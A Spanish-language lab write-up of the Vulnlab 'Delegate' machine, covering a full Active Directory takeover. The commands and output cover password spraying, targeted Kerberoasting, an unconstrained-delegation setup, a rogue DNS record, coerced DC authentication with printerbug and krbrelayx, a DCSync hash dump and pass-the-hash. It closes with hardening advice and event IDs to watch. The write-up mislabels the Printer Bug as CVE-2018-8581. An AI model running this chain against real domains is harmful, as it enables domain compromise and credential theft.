---
title: "VL Delegate"
date: 2026-01-12 20:15:00 +0000
categories: [WriteUp, Vulnlab, Machine, Windows]
tags: [Windows, Vulnlab, WriteUp, Medium, AD, Kerberos, Bloodhound, GenericWrite, Kerberoasting, Unconstrained-Delegation, DACL, DNS-Poisoning, Printer-Bug, DCSync]
image: /assets/img/posts//vl/delegate/Delegate-HTB.png
pin: false
Autor: vr0px  
---
## Descripción

**Delegate** es una máquina Windows de dificultad media que explora conceptos avanzados de Active Directory relacionados con **delegación Kerberos**. La explotación comienza con acceso anónimo a SYSVOL donde se descubren credenciales en scripts de inicio de sesión (logon scripts).

El camino de intrusión incluye:
- **GenericWrite** sobre cuentas de usuario para realizar **Targeted Kerberoasting**
- Abuso de **Unconstrained Delegation** mediante la creación de cuentas de máquina
- **DNS Poisoning** para redirigir tráfico hacia nuestro servidor malicioso
- **Printer Bug** para forzar autenticación del DC
- **Captura de TGT** del Domain Controller
- **DCSync** para extracción completa de credenciales

Esta máquina es un excelente escenario para comprender los peligros de la delegación sin restricciones y cómo los atacantes pueden abusar de estos permisos para comprometer completamente un dominio de Active Directory.

---

# Enumeración

## NMAP - Descubrimiento de Servicios

Iniciamos con un escaneo completo de puertos:

```shell
nmap -p- --open -sS --min-rate 8000 -Pn -n 10.129.231.243 -oG allPorts
Starting Nmap 7.93 ( https://nmap.org ) at 2026-01-12 09:21 -04
Nmap scan report for 10.129.231.243
Host is up (0.38s latency).
Not shown: 65508 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```

### Análisis de Puertos Críticos

Los puertos confirman un **Domain Controller**:
- **53** (DNS) - Servidor DNS del dominio
- **88** (Kerberos) - Autenticación Kerberos
- **389/636/3268/3269** (LDAP/LDAPS) - Servicios de directorio
- **445** (SMB) - Compartición de archivos
- **5985/47001** (WinRM) - Administración remota
- **3389** (RDP) - Escritorio remoto

### Escaneo de Versiones y Scripts

```shell
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001 -sCV 10.129.231.243 -oN targeted
```

### Información Recopilada

- **Dominio**: `delegate.vl`
- **FQDN del DC**: `DC1.delegate.vl`
- **NetBIOS**: `DELEGATE`
- **Hostname**: `DC1`
- **Sistema Operativo**: Windows Server 2022 Build 20348

### Configuración del /etc/hosts

```bash
echo '10.129.231.243  delegate.vl   DC1.delegate.vl  DC1' | tee -a /etc/hosts
```

---

## SMB - Enumeración de Recursos Compartidos

Verificamos si el acceso anónimo está habilitado:

```shell
nxc smb 10.129.231.243 -u anonymous -p ''
SMB         10.129.231.243   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.231.243   445    DC1              [+] delegate.vl\anonymous: (Guest)
```

### Acceso Anónimo Confirmado

Enumeramos los recursos compartidos disponibles:

```shell
nxc smb 10.129.231.243 -u anonymous -p '' --shares
SMB         10.129.231.243   445    DC1              Share           Permissions     Remark
SMB         10.129.231.243   445    DC1              -----           -----------     ------
SMB         10.129.231.243   445    DC1              ADMIN$                          Remote Admin
SMB         10.129.231.243   445    DC1              C$                              Default share
SMB         10.129.231.243   445    DC1              IPC$            READ            Remote IPC
SMB         10.129.231.243   445    DC1              NETLOGON        READ            Logon server share
SMB         10.129.231.243   445    DC1              SYSVOL          READ            Logon server share
```

### Recurso Crítico: SYSVOL

**SYSVOL** es un recurso compartido extremadamente importante que contiene:
- **Group Policy Objects (GPO)** - Políticas de grupo
- **Logon Scripts** - Scripts de inicio de sesión
- **GPP (Group Policy Preferences)** - Puede contener contraseñas cifradas

> **Nota**: SYSVOL es replicado entre todos los Domain Controllers y a menudo contiene información sensible, incluidas contraseñas en texto claro en scripts antiguos o mal configurados.
{: .prompt-tip }


### Exploración de SYSVOL

Nos conectamos al recurso compartido:

```shell
smbclient //10.129.231.243/SYSVOL -N
smb: \> dir
  delegate.vl                        Dr        0  Sat Aug 26 05:39:25 2023

smb: \delegate.vl\> dir
  scripts                             D        0  Sat Aug 26 08:45:24 2023

smb: \delegate.vl\scripts\> dir
  users.bat                           A      159  Sat Aug 26 08:54:29 2023

smb: \delegate.vl\scripts\> get users.bat
```

### Análisis del Script users.bat

```batch
cat users.bat
rem @echo off
net use * /delete /y
net use v: \\dc1\development

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123
```

**Credencial encontrada**: `P4ssw0rd1#123`

Este script de inicio de sesión contiene una **contraseña en texto claro** que se usa para mapear una unidad de red cuando el usuario `A.Briggs` inicia sesión.

---

## Enumeración de Usuarios del Dominio

### RID Cycling con lookupsid

```shell
lookupsid.py a@10.129.231.243 10000 -no-pass | grep -i sidtypeuser | awk '{print $2}' | sed 's/^DELEGATE\\//' > users.txt
cat users.txt
Administrator
Guest
krbtgt
DC1$
A.Briggs
b.Brown
R.Cooper
J.Roberts
N.Thompson
```

**¿Qué es RID Cycling?**

RID (Relative Identifier) es un componente del SID (Security Identifier) de cada objeto en Active Directory. Al enumerar RIDs secuencialmente, podemos descubrir usuarios válidos sin necesidad de credenciales.

---

## Password Spray Attack

Probamos la contraseña encontrada contra todos los usuarios:

```bash
nxc smb 10.129.231.243 -u users.txt -p 'P4ssw0rd1#123'
<SNIP>
SMB         10.129.231.243   445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123
<SNIP>
```

### Primera Credencial Válida

**Usuario comprometido**: `A.Briggs`  
**Contraseña**: `P4ssw0rd1#123`

---

## BloodHound - Mapeo de Active Directory

Recopilamos información del dominio con BloodHound:

```shell
bloodhound-ce.py --zip -c All -d "delegate.vl" -u "A.Briggs" -p 'P4ssw0rd1#123' -dc "dc1.delegate.vl" -ns 10.129.231.243
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: delegate.vl
INFO: Found 1 computers
INFO: Found 9 users
INFO: Found 53 groups
INFO: Done in 01M 15S
INFO: Compressing output into 20260112115023_bloodhound.zip
```

### Análisis de Permisos - Outbound Object Control

Al revisar los permisos del usuario `A.Briggs` en BloodHound, descubrimos algo crítico:

![GenericWrite]({{ '/assets/img/posts/vl/delegate/GenericWrite.png' | relative_url }}){: .center-image }


### Permiso GenericWrite sobre N.Thompson

El usuario `A.Briggs` tiene **GenericWrite** sobre `N.Thompson`, lo que significa que puede:
- Modificar la mayoría de los atributos del usuario
- **Agregar un SPN (Service Principal Name)** - ¡Esto es crítico!
- Cambiar propiedades como descripción, dirección, teléfono, etc.

**¿Por qué es importante?**

Con **GenericWrite** podemos realizar un ataque de **Targeted Kerberoasting**:
1. Agregar un SPN falso al usuario N.Thompson
2. Solicitar un TGS (Ticket Granting Service) para ese SPN
3. Crackear offline el hash del ticket para obtener la contraseña

---

# Intrusión

## Targeted Kerberoasting

### ¿Qué es Kerberoasting?

**Kerberoasting** es un ataque que explota cómo Kerberos cifra los tickets de servicio (TGS):
- Los TGS están cifrados con el hash NTLM de la cuenta de servicio
- Cualquier usuario autenticado puede solicitar TGS para servicios
- Podemos crackear offline estos tickets para recuperar contraseñas

**Targeted Kerberoasting** es una variante donde:
- Nosotros FORZAMOS que un usuario tenga un SPN (usando GenericWrite)
- Luego realizamos Kerberoasting contra ese usuario específico

### Ejecución del Ataque

Usamos `targetedKerberoast.py` que automáticamente:
1. Agrega un SPN temporal a N.Thompson
2. Solicita un TGS
3. Extrae el hash
4. Elimina el SPN (limpieza)

```bash
targetedKerberoast.py --dc-ip 10.129.231.243 -v -d 'delegate.vl' -u A.BRIGGS -p 'P4ssw0rd1#123'
[*] Starting kerberoast attacks
[VERBOSE] SPN added successfully for (N.Thompson)
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$5586bf7ac67ba1ad336a302b930bc9d1...
[VERBOSE] SPN removed successfully for (N.Thompson)
```

### Cracking del Hash con Hashcat

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
$krb5tgs$23$*N.Thompson$DELEGATE.VL[...]:KALEB_2341
```

### Segunda Credencial Válida

**Usuario comprometido**: `N.Thompson`  
**Contraseña**: `KALEB_2341`

Si vemos los grupos a los que pertenece, veremos que es miembro de **REMOTE MANAGEMENT USERS**.

![GenericWrite]({{ '/assets/img/posts/vl/delegate/Bloodhound.png' | relative_url }}){: .center-image }


---

## Acceso WinRM

Nos conectamos al DC usando Evil-WinRM:

```bash
evil-winrm -i delegate.vl -u 'N.THOMPSON' -p 'KALEB_2341'

Evil-WinRM shell v3.7
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\N.Thompson\Documents> type ../Desktop/user.txt
3e6290d021c05aa1289f0a907da60d1d
```

### Flag de Usuario Obtenida

**User Flag**: `3e6290d021c05aa1289f0a907da60d1d`

---

# Escalada de Privilegios


## Análisis de Privilegios
Una vez obtenido acceso como N.Thompson, verificamos los privilegios del usuario:
```bash
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
*Evil-WinRM* PS C:\Users\N.Thompson\Documents>
```
### Privilegios Críticos Identificados

El usuario N.Thompson posee dos privilegios especialmente importantes:

1. **SeMachineAccountPrivilege**: Permite agregar cuentas de máquina al dominio. Este privilegio nos permitirá crear nuestra propia cuenta de computadora para el ataque.

2. **SeEnableDelegationPrivilege**: Permite habilitar la delegación en cuentas de computadora y usuario. Este es el privilegio clave que explotaremos para configurar Unconstrained Delegation en nuestra cuenta de máquina maliciosa.

La combinación de estos privilegios nos permite ejecutar el ataque de Unconstrained Delegation completo: crear una cuenta de máquina, configurarla con delegación sin restricciones, y capturar tickets Kerberos de cuentas privilegiadas.

---





## Unconstrained Delegation Attack

### ¿Qué es Unconstrained Delegation?

**Unconstrained Delegation** (Delegación sin restricciones) es una característica de Active Directory que permite a un servicio/computadora actuar en nombre de cualquier usuario hacia cualquier servicio.

#### Cómo Funciona la Delegación Sin Restricciones

1. **Usuario** → Se autentica en **Servidor con Delegación**
2. El KDC incluye el **TGT del usuario** dentro del TGS
3. **Servidor** → Guarda el TGT del usuario en memoria
4. **Servidor** → Puede usar ese TGT para acceder a CUALQUIER servicio como ese usuario

#### ¿Por Qué es Peligroso?

Si un atacante compromete una máquina con Unconstrained Delegation:
- Puede **robar TGTs** de cualquier usuario que se autentique
- Si obtiene el TGT del **DC$** (cuenta de máquina del Domain Controller), puede hacer **DCSync**
- No hay límites sobre qué servicios puede acceder

### Estrategia del Ataque

Nuestra estrategia será:
1. **Crear una cuenta de máquina** bajo nuestro control
2. **Configurarla con Unconstrained Delegation**
3. **Envenenar DNS** para que apunte a nuestro servidor
4. **Forzar autenticación** del DC hacia nuestra máquina (Printer Bug)
5. **Capturar el TGT** del DC
6. **Usar el TGT** para hacer DCSync

---

## Paso 1: Crear Cuenta de Máquina

Por defecto, usuarios autenticados pueden agregar hasta **10 cuentas de máquina** al dominio (atributo `ms-DS-MachineAccountQuota`).

```bash
addcomputer.py delegate.vl/n.thompson:'KALEB_2341' -computer-name PWN -computer-pass "password123" -dc-ip 10.129.231.243
[*] Successfully added machine account PWN$ with password password123.
```

Creamos una cuenta de máquina llamada `PWN$` (el símbolo $ se agrega automáticamente a las cuentas de máquina) con contraseña `password123`.

---

## Paso 2: Configurar Unconstrained Delegation

Modificamos el atributo `userAccountControl` de nuestra máquina para agregar la flag `TRUSTED_FOR_DELEGATION`:

```bash
bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'PWN$' -f TRUSTED_FOR_DELEGATION
[-] ['TRUSTED_FOR_DELEGATION'] property flags added to PWN$'s userAccountControl
```

**¿Qué hace este flag?**

El flag `TRUSTED_FOR_DELEGATION` (valor 0x80000) le dice al KDC que esta cuenta es de confianza para realizar delegación. Cuando está activo:
- Los TGTs de usuarios que se autentiquen en esta máquina serán **incluidos en el TGS**
- La máquina puede **almacenar y reutilizar** esos TGTs
- Puede impersonar a esos usuarios hacia **cualquier servicio** del dominio

---

## Paso 3: Configurar DNS Poisoning

Para que el Domain Controller intente autenticarse en nuestra máquina, necesitamos que nuestro servidor sea resolvible en el DNS del dominio.

### Agregar Registro DNS

```shell
dnstool.py -u 'delegate.vl\PWN$' -p 'password123' -r 'Pwned.delegate.vl' -d 10.10.17.121 --action add DC1.delegate.vl -dns-ip 10.129.231.243
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

Agregamos un registro DNS tipo A que resuelve:
- `Pwned.delegate.vl` → `10.10.17.121` (nuestra IP atacante)

### Configurar SPNs (Service Principal Names)

Los SPNs identifican instancias de servicios en la red. Necesitamos configurar SPNs para que el DC confíe en nuestra máquina falsa.

#### Agregar SPN HOST

```bash
addspn.py -u delegate\\N.THOMPSON -p 'KALEB_2341' -s HOST/attacker.delegate.vl -q dc1.delegate.vl -t PWN$ -dc-ip 10.129.231.243
[-] Connecting to host...
[+] Bind OK
[+] Found modification target
```

**¿Qué es un SPN?**

Un SPN es un identificador único de una instancia de servicio. Formato: `servicio/host:puerto`. Ejemplos:
- `HTTP/webserver.domain.com:80`
- `HOST/server.domain.com` (servicio genérico de host)
- `CIFS/fileserver.domain.com` (servicio de archivos)

#### Agregar usando msDS-AdditionalDnsHostName

```shell
addspn.py -u delegate\\N.THOMPSON -p 'KALEB_2341' -s HOST/Pwned.delegate.vl dc1.delegate.vl -t 'PWN$' -dc-ip 10.129.231.243 --additional
[+] SPN Modified successfully
```

#### Agregar SPN HOST adicional

```bash
addspn.py -u 'delegate\N.THOMPSON' -p 'KALEB_2341' -s 'host/Pwned.delegate.vl' -t 'PWN$' -dc-ip 10.129.231.243 dc1.delegate.vl
[+] SPN Modified successfully
```

### Verificar Configuración DNS

```bash
nslookup Pwned.delegate.vl 10.129.231.243
Server:         10.129.231.243
Address:        10.129.231.243#53

Name:   Pwned.delegate.vl
Address: 10.10.17.121
```

DNS configurado correctamente. Ahora `Pwned.delegate.vl` resuelve a nuestra IP atacante.

---

## Paso 4: Preparar Listener de Kerberos

### Convertir Contraseña a Hash NT

Necesitamos el hash NT de la contraseña de nuestra cuenta de máquina:

```bash
iconv -f ASCII -t UTF-16LE <(printf 'password123') | openssl dgst -md4
MD4(stdin)= a9fdfa038c4b75ebc76dc855dd74f0da
```

**¿Por qué necesitamos el hash NT?**

Las cuentas de máquina usan el hash NT (NTLM) para autenticarse en Kerberos. Nuestro listener necesita este hash para descifrar tickets.

### Iniciar krbrelayx

`krbrelayx.py` es una herramienta que:
- Actúa como un servidor multi-protocolo (SMB, HTTP, LDAP)
- Captura autenticaciones Kerberos
- Extrae y guarda TGTs cuando detecta Unconstrained Delegation

```bash
krbrelayx.py -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA --interface-ip 10.10.17.121
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Running in export mode (all tickets will be saved to disk)
[*] Running in unconstrained delegation abuse mode
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server
[*] Servers started, waiting for connections
```

---

## Paso 5: Forzar Autenticación del DC (Printer Bug)

### ¿Qué es el Printer Bug?

El **Printer Bug** (CVE-2018-8581 / MS-RPRN) es una vulnerabilidad en el servicio Print Spooler de Windows que permite:
- Forzar a una máquina remota (incluido el DC) a **autenticarse** en una máquina especificada
- La autenticación se realiza con la **cuenta de máquina del sistema**
- Si el destino tiene Unconstrained Delegation, podemos capturar el TGT

### Ejecutar printerbug.py

```bash
printerbug.py 'delegate.vl/N.Thompson:KALEB_2341@dc1.delegate.vl' Pwned.delegate.vl
[*] Attempting to trigger authentication via rprn RPC at dc1.delegate.vl
[*] Bind OK
[*] Got handle
[*] Triggered RPC backconnect, this may or may not have worked
```

**¿Qué hace este comando?**

1. Se conecta al servicio Print Spooler del DC (`dc1.delegate.vl`)
2. Llama a la función RPC `RpcRemoteFindFirstPrinterChangeNotification`
3. Le indica al DC que envíe notificaciones a `Pwned.delegate.vl`
4. El DC intenta autenticarse en `Pwned.delegate.vl` (nuestro servidor)

### Captura del TGT del DC

En nuestro terminal de `krbrelayx.py`, observamos:

```bash
[*] SMBD: Received connection from 10.129.231.243
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

**¿Qué acabó de pasar?**

1. El DC (`10.129.231.243`) se conectó a nuestro servidor SMB
2. Se autenticó usando Kerberos
3. Como nuestra máquina tiene Unconstrained Delegation, el KDC incluyó el **TGT del DC** en el ticket
4. `krbrelayx.py` extrajo y guardó el TGT: `DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache`

### TGT del Domain Controller Capturado

Ahora tenemos el TGT de la cuenta de máquina del Domain Controller (`DC1$`), que tiene privilegios máximos en el dominio.

---

## Paso 6: Usar el TGT para Autenticación

Exportamos el ticket capturado:

```bash
export KRB5CCNAME='DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache'
```

Verificamos que el ticket funciona:

```bash
nxc smb 10.129.231.243 -k --use-kcache
SMB         10.129.231.243  445    DC1              [*] Windows Server 2022 Build 20348 x64
SMB         10.129.231.243  445    DC1              [+] DELEGATE.VL\DC1$ from ccache
```

Estamos autenticados como `DC1$` (la cuenta de máquina del Domain Controller) usando el ticket Kerberos capturado. Esta cuenta tiene los permisos más altos en el dominio.

---

## Paso 7: DCSync - Extracción de Credenciales

### ¿Qué es DCSync?

**DCSync** es un ataque que simula el comportamiento de un Domain Controller solicitando la replicación de credenciales del dominio. Requiere los siguientes permisos:
- **Replicating Directory Changes** (DS-Replication-Get-Changes)
- **Replicating Directory Changes All** (DS-Replication-Get-Changes-All)

Las cuentas de máquina de los DCs tienen estos permisos por defecto.

### DCSync con NetExec

```bash
nxc smb 10.129.231.243 -k --use-kcache --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely [Y/n] y
SMB         10.129.231.243  445    DC1              [+] DELEGATE.VL\DC1$ from ccache
SMB         10.129.231.243  445    DC1              [+] Dumping the NTDS, this could take a while...
SMB         10.129.231.243  445    DC1              Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
SMB         10.129.231.243  445    DC1              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.231.243  445    DC1              krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::
SMB         10.129.231.243  445    DC1              A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::
SMB         10.129.231.243  445    DC1              N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::
SMB         10.129.231.243  445    DC1              DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::
```

### Hashes Extraídos

Obtuvimos los hashes NT de **todos los usuarios del dominio**:

| Usuario | Hash NT |
|---------|---------|
| Administrator | `c32198ceab4cc695e65045562aa3ee93` |
| krbtgt | `54999c1daa89d35fbd2e36d01c4a2cf2` |
| A.Briggs | `8e5a0462f96bc85faf20378e243bc4a3` |
| N.Thompson | `4b514595c7ad3e2f7bb70e7e61ec1afe` |
| DC1$ | `f7caf5a3e44bac110b9551edd1ddfa3c` |

---

## Acceso Total - Pass-the-Hash

Usamos el hash NT del Administrador para autenticarnos:

```bash
evil-winrm -i delegate.vl -u 'administrator' -H 'c32198ceab4cc695e65045562aa3ee93'

Evil-WinRM shell v3.7
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
d604f7543e01fad228c51c922d59f64d
```

### Flag de Root Obtenida

**Root Flag**: `d604f7543e01fad228c51c922d59f64d`

---

# Conclusión

## Cadena de Ataque Completa

1. **Enumeración SMB** → Acceso anónimo a SYSVOL
2. **Credenciales en script** → `users.bat` con contraseña `P4ssw0rd1#123`
3. **Password Spray** → Usuario `A.Briggs` comprometido
4. **BloodHound** → Identificación de permiso GenericWrite
5. **Targeted Kerberoasting** → Obtención de hash de `N.Thompson`
6. **Cracking** → Contraseña `KALEB_2341` descubierta
7. **Acceso WinRM** → Shell como N.Thompson
8. **Crear cuenta de máquina** → `PWN$` con contraseña conocida
9. **Configurar Unconstrained Delegation** → Flag TRUSTED_FOR_DELEGATION
10. **DNS Poisoning** → Registro `Pwned.delegate.vl` apuntando a atacante
11. **Configurar SPNs** → Servicios HOST registrados
12. **Printer Bug** → Forzar autenticación del DC
13. **Captura de TGT** → TGT de DC1$ obtenido
14. **DCSync** → Extracción de todos los hashes del dominio
15. **Pass-the-Hash** → Acceso total como Administrator

## Resumen Visual del Ataque Unconstrained Delegation

```
┌────────────────────────────────────────────────────────────────┐
│                    ATAQUE DE DELEGACIÓN                        │
└────────────────────────────────────────────────────────────────┘

1. PREPARACIÓN
   ┌──────────┐
   │ Atacante │ → Crea cuenta PWN$ con Unconstrained Delegation
   └──────────┘

2. DNS POISONING
   ┌──────────┐
   │ Atacante │ → Agrega DNS: Pwned.delegate.vl → 10.10.17.121
   └──────────┘

3. PRINTER BUG
   ┌──────┐         ┌────────────┐
   │  DC  │ ←────── │ Printer Bug│ (Force Authentication)
   └──────┘         └────────────┘
      │
      │ Autenticación hacia Pwned.delegate.vl
      ↓
   ┌──────────────┐
   │ Servidor del │ → Captura TGT del DC
   │   Atacante   │
   └──────────────┘

4. DCSYNC
   ┌──────────┐         ┌──────┐
   │ Atacante │ ──TGT──→│  DC  │ → DCSync: Dump NTDS
   └──────────┘         └──────┘

5. PASS-THE-HASH
   ┌──────────┐
   │ Atacante │ → Hash del Admin → Acceso Total
   └──────────┘
```

## Conceptos Clave Aprendidos

### Unconstrained Delegation
- Permite que una máquina almacene TGTs de usuarios que se autentican
- Extremadamente peligroso si un atacante controla la máquina
- Los TGTs capturados pueden usarse para impersonar a cualquier usuario

### Printer Bug (MS-RPRN)
- Vulnerabilidad en el servicio Print Spooler
- Permite forzar autenticación remota de cualquier máquina
- Combinado con Unconstrained Delegation = Compromiso total

### DCSync
- Simula replicación de Domain Controller
- Extrae credenciales de todos los usuarios
- Requiere permisos específicos de replicación

## Lecciones Aprendidas

### Malas Configuraciones Explotadas

- Credenciales en scripts de SYSVOL
- Acceso anónimo a recursos compartidos
- Permisos GenericWrite sobre usuarios
- Usuarios con contraseñas débiles
- ms-DS-MachineAccountQuota permitiendo creación de cuentas
- Print Spooler habilitado en el DC
- Unconstrained Delegation permitida

### Recomendaciones de Seguridad

- **Nunca** almacenar credenciales en SYSVOL o scripts
- Deshabilitar acceso anónimo a recursos compartidos
- Auditar permisos DACL con BloodHound regularmente
- Implementar políticas de contraseñas robustas
- Reducir o eliminar `ms-DS-MachineAccountQuota`
- **Deshabilitar Print Spooler** en Domain Controllers
- **Evitar Unconstrained Delegation** - usar Constrained o RBCD
- Monitorear eventos Kerberos sospechosos (Event ID 4768, 4769)
- Implementar detección de DCSync (Event ID 4662)
- Segmentar red para limitar alcance de compromisos

### Indicadores de Compromiso (IOCs)

**Eventos de Windows a Monitorear**:
- Event ID 4741: Nueva cuenta de computadora creada
- Event ID 4742: Cambios en cuenta de computadora (UAC modificado)
- Event ID 4768: TGT solicitado (frecuencia anormal)
- Event ID 4769: TGS solicitado (para servicios inexistentes)
- Event ID 4662: Operación realizada en objeto AD (DCSync)
- Event ID 5145: Acceso a recursos compartidos (SYSVOL/NETLOGON)

---

## Referencias

- [Unconstrained Delegation - adsecurity.org](https://adsecurity.org/?p=1667)
- [Printer Bug - SpectorOps](https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/)
- [krbrelayx - GitHub](https://github.com/dirkjanm/krbrelayx)
- [Targeted Kerberoasting](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#targeted-kerberoasting)
- [DCSync Attack](https://attack.mitre.org/techniques/T1003/006/)
- [MS-RPRN Printer Bug](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn)
- [Kerberos Unconstrained Delegation](https://blog.sentry.security/domain-takeover-via-kerberos-unconstrained-delegation)

